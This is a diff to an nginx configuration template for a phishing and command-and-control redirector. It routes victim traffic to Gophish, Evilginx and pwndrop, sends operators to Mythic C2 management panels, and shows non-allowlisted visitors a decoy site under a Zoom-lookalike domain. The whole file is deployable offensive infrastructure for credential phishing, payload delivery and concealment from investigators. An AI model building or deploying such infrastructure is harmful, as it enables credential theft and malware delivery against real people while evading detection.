@@ -1,21 +1,39 @@
 # Aegis Centralized Smart Redirector
 # Entry point for all infrastructure traffic
 
-# Upstream definitions (Internal communication)
-upstream mythic_backend {
-    server {{ hostvars[groups['mythic'][0]]['ansible_host'] }}:7443;
+# Operator gating (allowlisted operator source IPs/CIDRs)
+# - Operators: forwarded to management/services
+# - Everyone else: sent to the decoy site on the redirector
+geo $is_operator {
+    default 0;
+{% for cidr in operator_allowlist | default([]) %}
+    {{ cidr }} 1;
+{% endfor %}
 }
 
-upstream gophish_backend {
-    server {{ hostvars[groups['gophish'][0]]['ansible_host'] }}:3333;
+# Upstream definitions (Internal communication)
+upstream mythic_backend {
+    server {{ groups['mythic'][0] }}:7443;
+}
+
+upstream gophish_public_backend {
+    server {{ groups['gophish'][0] }}:8080;
+}
+
+upstream gophish_admin_backend {
+    server {{ groups['gophish'][0] }}:3333;
 }
 
 upstream evilginx_backend {
-    server {{ hostvars[groups['evilginx'][0]]['ansible_host'] }}:443;
+    server {{ groups['evilginx'][0] }}:443;
 }
 
 upstream pwndrop_backend {
-    server {{ hostvars[groups['pwndrop'][0]]['ansible_host'] }}:8080;
+    server {{ groups['pwndrop'][0] }}:8080;
+}
+
+upstream decoy_backend {
+    server 127.0.0.1:8080;
 }
 
 # 1. Main Decoy / Base Domain (e.g., zoom-meeting.duckdns.org)
@@ -68,7 +86,8 @@ server {
     ssl_certificate_key /etc/letsencrypt/live/{{ base_domain }}/privkey.pem;
 
     location / {
-        proxy_pass http://gophish_backend;
+        # Public phishing site entry (victim traffic)
+        proxy_pass http://gophish_public_backend;
         proxy_set_header Host $host;
         add_header X-Aegis-Filter "Phish-Entry";
     }
@@ -83,6 +102,7 @@ server {
     ssl_certificate_key /etc/letsencrypt/live/{{ base_domain }}/privkey.pem;
 
     location / {
+        # Operational domain (victim traffic)
         proxy_pass https://evilginx_backend;
         proxy_set_header Host $host;
         proxy_ssl_verify off; # Evilginx uses its own certs
@@ -99,8 +119,63 @@ server {
     ssl_certificate_key /etc/letsencrypt/live/{{ base_domain }}/privkey.pem;
 
     location / {
+        # Operational domain (payload delivery)
         proxy_pass http://pwndrop_backend;
         proxy_set_header Host $host;
         add_header X-Aegis-Filter "Payload-Delivery";
+    }
+}
+
+# 6. Operator Management Portal (ops.*)
+# Operator-only entry point for management UIs.
+server {
+    listen 443 ssl;
+    server_name ops.{{ base_domain }};
+
+    ssl_certificate /etc/letsencrypt/live/{{ base_domain }}/fullchain.pem;
+    ssl_certificate_key /etc/letsencrypt/live/{{ base_domain }}/privkey.pem;
+
+    # Non-operators see decoy
+    if ($is_operator = 0) {
+        proxy_pass http://decoy_backend;
+        break;
+    }
+
+    location /mythic/ {
+        rewrite ^/mythic/?(.*)$ /$1 break;
+        proxy_pass https://mythic_backend;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        add_header X-Aegis-Filter "Ops-Mythic";
+    }
+
+    location /gophish/ {
+        rewrite ^/gophish/?(.*)$ /$1 break;
+        proxy_pass http://gophish_admin_backend;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        add_header X-Aegis-Filter "Ops-GoPhish";
+    }
+
+    location /evilginx/ {
+        rewrite ^/evilginx/?(.*)$ /$1 break;
+        proxy_pass https://evilginx_backend;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_ssl_verify off;
+        add_header X-Aegis-Filter "Ops-Evilginx";
+    }
+
+    location /pwndrop/ {
+        rewrite ^/pwndrop/?(.*)$ /$1 break;
+        proxy_pass http://pwndrop_backend;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        add_header X-Aegis-Filter "Ops-Pwndrop";
+    }
+
+    location / {
+        proxy_pass http://decoy_backend;
+        add_header X-Aegis-Filter "Ops-Decoy";
     }
 }
